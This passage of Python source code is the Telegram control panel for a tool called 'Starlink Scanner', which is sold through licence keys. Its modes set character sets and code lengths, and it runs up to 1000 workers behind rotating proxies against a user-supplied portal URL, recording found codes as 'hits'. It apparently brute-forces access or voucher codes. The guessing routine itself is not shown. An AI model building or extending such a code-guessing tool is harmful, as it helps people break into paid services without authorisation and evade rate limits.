         InlineKeyboardButton("➕ +2d", callback_data="extend_add_2d")],
        [InlineKeyboardButton("➕ +3d", callback_data="extend_add_3d"),
         InlineKeyboardButton("➕ +7d", callback_data="extend_add_7d")],
        [InlineKeyboardButton("➕ +15d", callback_data="extend_add_15d"),
         InlineKeyboardButton("➕ +30d", callback_data="extend_add_30d")],
        [InlineKeyboardButton("➖ -1h", callback_data="extend_sub_1h"),
         InlineKeyboardButton("➖ -1d", callback_data="extend_sub_1d")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
    ])


def get_admin_panel_text():
    keys = load_keys()
    users = load_users()
    bot_users = load_bot_users()
    admins = load_admin_ids()
    pm = get_proxy_manager()
    total_p, active_p = pm.stats()
    return (
        "👑 <b>ADMIN PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Keys        : <code>{len(keys)}</code>\n"
        f"👥 Users       : <code>{len(users)}</code>\n"
        f"📇 Bot Users   : <code>{len(bot_users)}</code>\n"
        f"👑 Admins      : <code>{len(admins)}</code>\n"
        f"🔀 Proxies     : <code>{active_p}/{total_p}</code>\n"
        f"🛡️ Shield      : <code>{'PAUSED' if _cpu_paused else 'ACTIVE'}</code>\n"
        f"🕐 Time (MMT)  : <code>{now_mm().strftime('%Y-%m-%d %I:%M %p')}</code>\n━━━━━━━━━━━━━━━━━━"
    )


# ═══════════════════════════════════════════════════════════════
#  🎛️ KEYBOARDS
# ═══════════════════════════════════════════════════════════════
def get_main_menu_markup(is_admin_user=False):
    rows = [
        [InlineKeyboardButton(text="🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu"),
         InlineKeyboardButton(text="⚙️ Set Workers", callback_data="btn_set_workers")],
        [InlineKeyboardButton(text="🔍 Proxy Checker", callback_data="btn_proxy_checker")],
        [InlineKeyboardButton(text="💳 Manual Balance", callback_data="btn_manual_balance")],
        [InlineKeyboardButton(text="🚀 Start Scanner", callback_data="btn_start_scanner")],
    ]
    if is_admin_user:
        rows.append([InlineKeyboardButton(text="👑 Admin Panel", callback_data="admin_panel")])
    rows.append([InlineKeyboardButton(text="⚡ KYAWZIN ⚡", url=CONTACT_LINK)])
    return InlineKeyboardMarkup(rows)


def get_access_required_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔑 Enter Key", callback_data="btn_enter_key")],
        [InlineKeyboardButton(text="⚡ KYAWZIN ⚡", url=CONTACT_LINK)],
    ])


def get_key_entry_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔙 Back", callback_data="btn_back_to_access")]
    ])


def get_workers_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="💡 100", callback_data="set_workers_100"),
         InlineKeyboardButton(text="⚡ 300", callback_data="set_workers_300")],
        [InlineKeyboardButton(text="🚀 500", callback_data="set_workers_500"),
         InlineKeyboardButton(text="🔥 1000", callback_data="set_workers_1000")],
        [InlineKeyboardButton(text="✏️ Custom", callback_data="set_workers_custom")],
        [InlineKeyboardButton(text="🔂 RETURN", callback_data="btn_back_main")],
    ])


def get_mode_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔢 6", callback_data="set_mode_num6"),
         InlineKeyboardButton(text="🔢 7", callback_data="set_mode_num7"),
         InlineKeyboardButton(text="🔢 8", callback_data="set_mode_num8"),
         InlineKeyboardButton(text="🔢 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton(text="🔤 Abc 6", callback_data="set_mode_abc6")],
        [InlineKeyboardButton(text="🔤 Eng 6", callback_data="set_mode_eng6"),
         InlineKeyboardButton(text="🔤 Eng 7", callback_data="set_mode_eng7")],
        [InlineKeyboardButton(text="🔤 Eng 8", callback_data="set_mode_eng8"),
         InlineKeyboardButton(text="🔤 Eng 9", callback_data="set_mode_eng9")],
        [InlineKeyboardButton(text="🎲 Mix 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton(text="🎲 Mix 7", callback_data="set_mode_mix7")],
        [InlineKeyboardButton(text="🎲 Mix 8", callback_data="set_mode_mix8"),
         InlineKeyboardButton(text="🎲 Mix 9", callback_data="set_mode_mix9")],
        [InlineKeyboardButton(text="⭐ Custom Start", callback_data="set_mode_custom")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
    ])


# ═══════════════════════════════════════════════════════════════
#  🔐 DECORATORS
# ═══════════════════════════════════════════════════════════════
def auth_required(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        try:
            track_bot_user(update.effective_user)
        except Exception:
            pass
        if is_admin(user_id):
            return await func(update, context, *args, **kwargs)
        access_ok, access_msg = check_user_access(user_id)
        if access_ok:
            return await func(update, context, *args, **kwargs)
        if update.effective_message:
            await update.effective_message.reply_text(
                f"🔐 <b>ACCESS REQUIRED</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"👤 Your ID: <code>{user_id}</code>\n"
                f"📋 Status: <b>{access_msg}</b>\n\n"
                f"🔑 Key ထည့်ပြီး access ရယူပါ",
                parse_mode=ParseMode.HTML,
                reply_markup=get_access_required_markup())
        return
    return wrapper


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_admin(user_id):
            if update.effective_message:
                await update.effective_message.reply_text("⛔ Admin only.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════
#  📞 COMMANDS
# ═══════════════════════════════════════════════════════════════
@auth_required
async def start(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = None
    _, access_msg = check_user_access(user_id)

    # ★ Proxy အရေအတွက် ဆွဲထုတ်ခြင်း ★
    pm = get_proxy_manager()
    total_p, active_p = pm.stats()

    text = (
        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"🔐 Access: `{access_msg}`\n"
        f"⚙️ Mode: `{ud['mode']}`\n"
        f"🔀 Proxies: `{active_p}/{total_p}`\n"
        f"⚙️ Workers: `{ud['num_workers']}`\n"
        f"🛡️ Shield: `{'PAUSED' if _cpu_paused else 'ACTIVE'}`"
    )
    msg = await update.message.reply_text(
        text,
        reply_markup=get_main_menu_markup(is_admin(user_id)),
        parse_mode=ParseMode.MARKDOWN)
    ud["menu_msg_id"] = msg.message_id


@auth_required
async def stop_cmd(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    stopped_something = False

    if ud["task"] and not ud["task"].done():
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        ud["task"].cancel()
        stopped_something = True

    if ud.get("scanner_task") and not ud["scanner_task"].done():
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        ud["scanner_task"].cancel()
        stopped_something = True

    pc = user_proxy_checks.get(user_id)
    if pc and pc.get("stop_event"):
        pc["stop_event"].set()
        if pc.get('task') and not pc['task'].done():
            try:
                pc['task'].cancel()
            except Exception:
                pass
        stopped_something = True

    st = user_manual_balance.get(user_id)
    if st and st.get('running'):
        st['stop_event'].set()
        if st.get('task') and not st['task'].done():
            try:
                st['task'].cancel()
            except Exception:
                pass
        stopped_something = True

    if stopped_something:
        ResourceWatchdog._trim_heap()
        gc.collect()
        await update.message.reply_text(f"🛑 Stopped\n{BOT_TAGLINE}")
    else:
        await update.message.reply_text(f"ℹ️ Nothing running\n{BOT_TAGLINE}")


async def myid_command(update, context):
    user_id = update.effective_user.id
    try:
        track_bot_user(update.effective_user)
    except Exception:
        pass
    access_ok, access_msg = check_user_access(user_id)
    await update.message.reply_text(
        f"👤 <b>Your Info</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👑 Admin: {'✅' if is_admin(user_id) else '❌'}\n"
        f"🔐 Access: {access_msg}",
        parse_mode=ParseMode.HTML)


async def mykey_command(update, context):
    try:
        track_bot_user(update.effective_user)
    except Exception:
        pass
    context.user_data["waiting_for_key"] = True
    await update.message.reply_text(
        "🔑 <b>ENTER KEY</b>\n"
        "Format: <code>XXXX-XXXX-XXXX-XXXX</code>\n\n"
        "Key ပို့ပါ ↓",
        parse_mode=ParseMode.HTML,
        reply_markup=get_key_entry_markup())


@admin_only
async def addadmin_command(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("📝 <code>/addadmin 1234567890</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID")
        return
    if add_admin_id(target_id):
        await update.message.reply_text(f"✅ Added: <code>{target_id}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"ℹ️ Already: <code>{target_id}</code>", parse_mode=ParseMode.HTML)


@admin_only
async def removeadmin_command(update, context):
    args = context.args
    if not args:
        return
    try:
        target_id = int(args[0])
    except ValueError:
        return
    if target_id in ADMIN_IDS:
        await update.message.reply_text(f"⚠️ Hardcoded: <code>{target_id}</code>", parse_mode=ParseMode.HTML)
        return
    if remove_admin_id(target_id):
        await update.message.reply_text(f"✅ Removed: <code>{target_id}</code>", parse_mode=ParseMode.HTML)


@admin_only
async def broadcast_command(update, context):
    context.user_data["awaiting_broadcast"] = True
    bot_users = load_bot_users()
    total = len(bot_users)
    await update.message.reply_text(
        "📢 <b>BROADCAST MESSAGE</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👥 Recipients: <b>{total}</b> users\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "User အားလုံးဆီ ပို့မယ့် Message ကို ရိုက်ထည့်ပါ။",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("❌  CANCEL", callback_data="admin_panel")]]))


@admin_only
async def clearall_command(update, context):
    keys = load_keys()
    users = load_users()
    bot_users = load_bot_users()

    await update.message.reply_text(
        "🧹 <b>CLEAR ALL DATA</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Keys      : <b>{len(keys)}</b>\n"
        f"👥 Users     : <b>{len(users)}</b>\n"
        f"📇 Bot Users : <b>{len(bot_users)}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "⚠️ <b>ဒါအားလုံးကို ဖျက်မှာ သေချာပါသလား?</b>\n"
        "ဖျက်ရင် Keys / Users / Bot Users အားလုံး ပျက်သွားမယ်။",
        parse_mode=ParseMode.HTML,
        reply_markup=get_clear_all_confirm_markup())


@admin_only
async def allhits_cmd(update, context):
    lines = []
    grand = 0
    for uid, st in user_scanners.items():
        hits = st.get("valid_codes", [])
        if hits:
            lines.append(f"<code>{uid}</code> — <b>{len(hits)}</b> ခု")
            grand += len(hits)
    if not lines:
        await update.message.reply_text("📋 Hit မရှိဘူး။")
        return
    body = "\n".join(lines)
    if len(body) > 3500:
        body = body[:3500] + "\n<i>...</i>"
    await update.message.reply_text(
        f"📊 <b>All Hits — {grand} ခု</b>\n\n{body}",
        parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════════════════
#  📞 CALLBACKS
# ═══════════════════════════════════════════════════════════════
async def handle_callbacks(update, context):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data

    try:
        track_bot_user(update.effective_user)
    except Exception:
        pass

    if data == "stop_scan":
        try:
            await query.answer("🛑 Stopping...", show_alert=False)
        except Exception:
            pass
        ud = user_scanners.get(user_id)
        if ud:
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            if ud.get("task") and not ud["task"].done():
                try:
                    ud["task"].cancel()
                except Exception:
                    pass
        return

    if data == "btn_enter_key":
        try:
            await query.answer()
        except Exception:
            pass
        context.user_data["waiting_for_key"] = True
        await query.edit_message_text(
            "🔑 <b>ENTER KEY</b>\n"
            "Format: <code>XXXX-XXXX-XXXX-XXXX</code>\n\n"
            "Key ပို့ပါ ↓",
            parse_mode=ParseMode.HTML,
            reply_markup=get_key_entry_markup())
        return

    if data == "btn_back_to_access":
        try:
            await query.answer()
        except Exception:
            pass
        context.user_data["waiting_for_key"] = False
        access_ok, access_msg = check_user_access(user_id)
        if access_ok:
            ud = get_user_data(user_id)
            await query.edit_message_text(
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"🔐 Access: `{access_msg}`\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"⚙️ Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text(
                f"🔐 <b>ACCESS REQUIRED</b>\n"
                f"👤 ID: <code>{user_id}</code>\n"
                f"📋 {access_msg}\n\n"
                f"🔑 Key ထည့်ပါ",
                parse_mode=ParseMode.HTML,
                reply_markup=get_access_required_markup())
        return

    try:
        await query.answer()
    except Exception:
        pass

    ud = get_user_data(user_id)

    try:
        # ═══════ ADMIN PANEL ═══════
        if data.startswith("admin_") or data.startswith("extend_"):
            if not is_admin(user_id):
                try:
                    await query.answer("Admin only", show_alert=True)
                except Exception:
                    pass
                return

            if data == "admin_panel":
                await query.edit_message_text(
                    get_admin_panel_text(),
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_admin_panel_markup())
                return
            if data == "admin_list_admins":
                admins = load_admin_ids()
                lines = ["👑 <b>ADMIN IDS</b>\n━━━━━━━━━━━━━━━━━━"]
                for i, aid in enumerate(admins, 1):
                    tag = " (hardcoded)" if aid in ADMIN_IDS else ""
                    lines.append(f"{i}. <code>{aid}</code>{tag}")
                await query.edit_message_text(
                    "\n".join(lines), parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_gen_key":
                await query.edit_message_text(
                    "🔑 Duration ရွေးပါ:",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_admin_duration_markup())
                return
            if data.startswith("admin_dur_"):
                dur = data[len("admin_dur_"):]
                if dur == "unlimited":
                    sec, label = 0, "♾ Unlimited"
                else:
                    sec, label = DURATION_MAP.get(dur, (None, None))
                    if sec is None:
                        return
                context.user_data["admin_gen_duration"] = {"sec": sec, "label": label}
                context.user_data["admin_waiting"] = "gen_key_user"
                await query.edit_message_text(
                    f"🔑 <b>{label}</b>\nUser ID ပို့ပါ →",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_gen_key")]]))
                return
            if data == "admin_del_key":
                context.user_data["admin_waiting"] = "del_key_input"
                await query.edit_message_text(
                    "🗑 User ID / Key ပို့ပါ:",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_clear_all_keys":
                keys = load_keys()
                users = load_users()
                bot_users = load_bot_users()
                await query.edit_message_text(
                    "🧹 <b>CLEAR ALL DATA</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 Keys      : <b>{len(keys)}</b>\n"
                    f"👥 Users     : <b>{len(users)}</b>\n"
                    f"📇 Bot Users : <b>{len(bot_users)}</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "⚠️ <b>ဒါအားလုံးကို ဖျက်မှာ သေချာပါသလား?</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_clear_all_confirm_markup())
                return
            if data == "admin_clear_all_confirm":
                result = clear_all_data()
                await query.edit_message_text(
                    "✅ <b>ALL DATA CLEARED</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"🗑️ Keys removed      : <b>{result['keys']}</b>\n"
                    f"🗑️ Users removed     : <b>{result['users']}</b>\n"
                    f"🗑️ Bot Users removed : <b>{result['bot_users']}</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "🕐 " + now_mm().strftime('%Y-%m-%d %I:%M %p'),
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_admin_panel_markup())
                return
            if data == "admin_list_keys":
                keys = load_keys()
                if not keys:
                    body = "<i>No keys.</i>"
                else:
                    lines = []
                    for k, v in keys.items():
                        uid = v.get("user_id", "?")
                        label = v.get("label", "?")
                        used = "✅" if v.get("used_by") else "🆓"
                        lines.append(f"🔑 <code>{k}</code>\n   👤 <code>{uid}</code> ⏱ {label} {used}")
                    body = "\n\n".join(lines)
                if len(body) > 3500:
                    body = body[:3500] + "\n<i>...</i>"
                await query.edit_message_text(
                    f"📋 Keys: <code>{len(keys)}</code>\n\n{body}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_users_list":
                users = load_users()
                keys = load_keys()
                # ★ သက်တမ်းမကုန်သေးတဲ့ သို့မဟုတ် Key ရှိနေသေးတဲ့ User တွေကိုပဲ ပြမယ် ★
                active_users = {}
                now_ts = time.time()
                for uid, info in users.items():
                    exp = info.get("expires_at", 0)
                    via_key = info.get("via_key")
                    # သက်တမ်းမကုန်သေးရင် ဒါမှမဟုတ် Key ဖျက်မခံရသေးရင် ပြမယ်
                    if (exp == 0 or now_ts < exp) and (not via_key or via_key in keys):
                        active_users[uid] = info

                lines = [f"👥 <b>USERS</b> ({len(active_users)})"]
                for uid, info in list(active_users.items())[:30]:
                    exp = info.get("expires_at", 0)
                    if exp == 0:
                        st = "♾"
                    else:
                        rem = int(exp - now_ts)
                        st = f"⏳ {rem//86400}d {(rem%86400)//3600}h"
                    lines.append(f"<code>{uid}</code> — {st}")
                await query.edit_message_text(
                    "\n".join(lines),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_bot_users":
                bot_users = load_bot_users()
                users = load_users()
                keys = load_keys()
                now_ts = time.time()

                # ★ သက်တမ်းမကုန်သေးတဲ့ သို့မဟုတ် Key ရှိနေသေးတဲ့ User တွေကိုပဲ ပြမယ် ★
                active_bot_users = []
                for uid_str, info in bot_users.items():
                    user_info = users.get(uid_str)
                    if user_info:
                        exp = user_info.get("expires_at", 0)
                        via_key = user_info.get("via_key")
                        if (exp == 0 or now_ts < exp) and (not via_key or via_key in keys):
                            active_bot_users.append(info)
                    else:
                        # User မရှိရင် (ဒါပေမယ့် Bot ကို ဝင်ထားရင်) ပြမယ်
                        active_bot_users.append(info)

                sorted_users = sorted(active_bot_users, key=lambda x: x.get("last_seen", 0), reverse=True)
                lines = [f"📇 <b>BOT USERS</b> ({len(active_bot_users)})"]
                for info in sorted_users[:30]:
                    uid = info.get("id", "?")
                    name = info.get("first_name", "") or "?"
                    uname = info.get("username", "")
                    lines.append(f"<code>{uid}</code> — {name} @{uname}")
                body = "\n".join(lines)
                if len(body) > 3500:
                    body = body[:3500] + "\n<i>...</i>"
                await query.edit_message_text(
                    body,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_set_user":
                context.user_data["admin_waiting"] = "set_user_key_input"
                await query.edit_message_text(
                    "👤 Key ထည့်ပါ →",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data.startswith("extend_add_") or data.startswith("extend_sub_"):
                key = context.user_data.get("extend_key")
                if not key:
                    return
                keys = load_keys()
                if key not in keys:
                    return
                if data.startswith("extend_add_"):
                    dur = data[len("extend_add_"):]
                    sec, label = DURATION_MAP.get(dur, (None, None))
                    sign = "+"
                else:
                    dur = data[len("extend_sub_"):]
                    sec, label = DURATION_MAP.get(dur, (None, None))
                    sign = "-"
                if sec is None:
                    return
                delta = sec if sign == "+" else -sec
                info = keys[key]
                if info.get("used_by"):
                    base = info.get("activated_expires_at", int(time.time()))
                    new_exp = max(base + delta, int(time.time()) + 60)
                    info["activated_expires_at"] = new_exp
                    uid = str(info.get("used_by"))
                    users = load_users()
                    if uid in users:
                        users[uid]["expires_at"] = new_exp
                        save_users(users)
                else:
                    base = int(info.get("duration_sec", 0))
                    new_dur = 0 if base == 0 else max(base + delta, 60)
                    info["duration_sec"] = new_dur
                keys[key] = info
                save_keys(keys)
                await query.edit_message_text(
                    f"✅ Updated: <code>{key}</code>\n📝 {sign} {label}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_panel")]]))
                context.user_data.pop("extend_key", None)
                return
            if data == "admin_set_unlimited":
                context.user_data["admin_waiting"] = "set_unlimited"
                await query.edit_message_text(
                    "♾ User ID ပို့ပါ →",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_bot_stats":
                pm = get_proxy_manager()
                t_p, a_p = pm.stats()
                users = load_users()
                keys = load_keys()
                bot_users = load_bot_users()
                active_scans = sum(1 for st in user_scanners.values() if st.get("task"))

                # ★ သက်တမ်းမကုန်သေးတဲ့ User အရေအတွက်ကိုပဲ တွက်မယ် ★
                now_ts = time.time()
                active_users_count = 0
                for uid, info in users.items():
                    exp = info.get("expires_at", 0)
                    via_key = info.get("via_key")
                    if (exp == 0 or now_ts < exp) and (not via_key or via_key in keys):
                        active_users_count += 1

                await query.edit_message_text(
                    f"📊 <b>BOT STATS</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"📇 Bot Users   : <code>{len(bot_users)}</code>\n"
                    f"👥 Activated   : <code>{active_users_count}</code>\n"
                    f"🔑 Keys        : <code>{len(keys)}</code>\n"
                    f"🔀 Proxies     : <code>{a_p}/{t_p}</code>\n"
                    f"🛡️ Shield      : <code>{'PAUSED' if _cpu_paused else 'ACTIVE'}</code>\n"
                    f"▶️ Active Scans: <code>{active_scans}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return
            if data == "admin_broadcast":
                context.user_data["awaiting_broadcast"] = True
                bot_users = load_bot_users()
                total = len(bot_users)
                await query.edit_message_text(
                    "📢 <b>BROADCAST MESSAGE</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"👥 Recipients: <b>{total}</b> users\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "User အားလုံးဆီ ပို့မယ့် Message ကို ရိုက်ထည့်ပါ။",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("❌  CANCEL", callback_data="admin_panel")]]))
                return
            if data == "admin_broadcast_send":
                message_text = context.user_data.get("broadcast_preview")
                if not message_text:
                    await query.edit_message_text(
                        "⚠️ <b>NO MESSAGE</b>\n\nPreview မရှိတော့ပါ။ ပြန်စပါ။",
                        parse_mode=ParseMode.HTML, reply_markup=get_admin_panel_markup())
                    return
                try:
                    await query.edit_message_text(
                        "📢 <b>Broadcasting started...</b>\n\n⏳ ခဏစောင့်ပါ။",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                await broadcast_message_from_query(query, context, message_text)
                return
            if data == "admin_broadcast_cancel":
                context.user_data["awaiting_broadcast"] = False
                context.user_data.pop("broadcast_preview", None)
                await query.edit_message_text(
                    "❌ <b>BROADCAST CANCELLED</b>",
                    parse_mode=ParseMode.HTML, reply_markup=get_admin_panel_markup())
                return

            if data == "admin_add_proxies":
                ud["state"] = "admin_waiting_proxy_text"
                await query.edit_message_text(
                    f"➕ <b>ADMIN — ADD PROXIES</b>\n"
                    f"{DIV}\n"
                    f"💫 Send proxies\n"
                    f"📝 One per line\n"
                    f"📌 Admin အတွက်ပဲ",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return

            if data == "admin_check_proxies":
                try:
                    await query.answer("⏳ Starting proxy check...", show_alert=False)
                except Exception:
                    pass
                await query.edit_message_text(
                    f"🔍 <b>ADMIN — CHECK PROXIES</b>\n"
                    f"{DIV}\n"
                    f"⏳ Starting...",
                    parse_mode=ParseMode.HTML)
                asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))
                return

            if data == "admin_manual_url":
                ud["state"] = "admin_waiting_proxy_url"
                await query.edit_message_text(
                    f"🔗 <b>ADMIN — MANUAL PROXY URL</b>\n"
                    f"{DIV}\n"
                    f"💫 Send URL\n"
                    f"📌 Admin အတွက်ပဲ",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return

            if data == "admin_reset_proxies":
                pm = get_proxy_manager()
                pm.clear_file()
                await query.edit_message_text(
                    f"♻️ <b>ADMIN — RESET PROXIES</b>\n"
                    f"{DIV}\n"
                    f"✅ {PROXY_FILE} cleared\n"
                    f"🔀 Proxies: 0/0",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
                return

            if data == "admin_close":
                await query.edit_message_text(
                    f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                    f"⚙️ Mode: `{ud['mode']}`\n"
                    f"⚙️ Workers: `{ud['num_workers']}`",
                    reply_markup=get_main_menu_markup(is_admin(user_id)),
                    parse_mode=ParseMode.MARKDOWN)
                return

        # ═══════ USER MENUS ═══════
        if data == "btn_update_portal":
            ud["state"] = "waiting_for_portal_url"
            await query.message.edit_text(
                f"🌐 UPDATE PORTAL\n"
                f"{DIV}\n"
                f"💫 Send Portal URL\n"
            )
            return

        if data == "btn_mode_menu":
            await query.message.edit_text(
                f"⚙️ CHOOSE MODE\n"
                f"{DIV}\n"
                f"💫 ရွေးချယ်လိုက်ပါ...",
                reply_markup=get_mode_menu_markup())
            return

        if data.startswith("set_mode_"):
            selected_mode = data.split("set_mode_")[1]
            if selected_mode == "num6":
                ud["mode"] = "num6"; ud["char_set"] = "012345678"; ud["code_len"] = 6; ud["start_digit"] = None
            elif selected_mode == "num7":
                ud["mode"] = "num7"; ud["char_set"] = "012345678"; ud["code_len"] = 7; ud["start_digit"] = None
            elif selected_mode == "num8":
                ud["mode"] = "num8"; ud["char_set"] = "012345678"; ud["code_len"] = 8; ud["start_digit"] = None
            elif selected_mode == "num9":
                ud["mode"] = "num9"; ud["char_set"] = "012345678"; ud["code_len"] = 9; ud["start_digit"] = None
            elif selected_mode == "abc6":
                ud["mode"] = "abc6"; ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6; ud["start_digit"] = None
            elif selected_mode == "eng6":
                ud["mode"] = "eng6"; ud["char_set"] = "abcdefghijklmnopqrstuvwxyz"; ud["code_len"] = 6; ud["start_digit"] = None
            elif selected_mode == "eng7":
                ud["mode"] = "eng7"; ud["char_set"] = "abcdefghijklmnopqrstuvwxyz"; ud["code_len"] = 7; ud["start_digit"] = None
            elif selected_mode == "eng8":
                ud["mode"] = "eng8"; ud["char_set"] = "abcdefghijklmnopqrstuvwxyz"; ud["code_len"] = 8; ud["start_digit"] = None
            elif selected_mode == "eng9":
                ud["mode"] = "eng9"; ud["char_set"] = "abcdefghijklmnopqrstuvwxyz"; ud["code_len"] = 9; ud["start_digit"] = None
            elif selected_mode == "mix6":
                ud["mode"] = "mix6"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6; ud["start_digit"] = None
            elif selected_mode == "mix7":
                ud["mode"] = "mix7"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 7; ud["start_digit"] = None
            elif selected_mode == "mix8":
                ud["mode"] = "mix8"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 8; ud["start_digit"] = None
            elif selected_mode == "mix9":
                ud["mode"] = "mix9"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 9; ud["start_digit"] = None
            elif selected_mode == "custom":
                ud["mode"] = "custom"; ud["char_set"] = "012345678"; ud["code_len"] = 6
                ud["state"] = "waiting_for_digit"
                await query.message.edit_text(
                    f"⭐ CUSTOM START\n"
                    f"{DIV}\n"
                    f"🔢 Send start digit (0-9)"
                )
                return

            pm = get_proxy_manager()
            total_p, active_p = pm.stats()
            await query.message.edit_text(
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{active_p}/{total_p}`\n"
                f"⚙️ Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
            return

        if data == "btn_back_main":
            pm = get_proxy_manager()
            total_p, active_p = pm.stats()
            await query.message.edit_text(
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{active_p}/{total_p}`\n"
                f"⚙️ Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
            return

        if data == "btn_set_workers":
            await query.message.edit_text(
                f"⚙️ SET WORKERS\n"
                f"{DIV}\n"
                f"📊 Current: {ud['num_workers']}\n"
                f"💡 Range: {MIN_WORKERS} - {MAX_WORKERS}",
                reply_markup=get_workers_menu_markup())
            return

        if data.startswith("set_workers_"):
            val = data[len("set_workers_"):]
            if val == "custom":
                ud["state"] = "waiting_for_workers"
                await query.message.edit_text(f"✏️ Enter {MIN_WORKERS}-{MAX_WORKERS}:")
                return
            try:
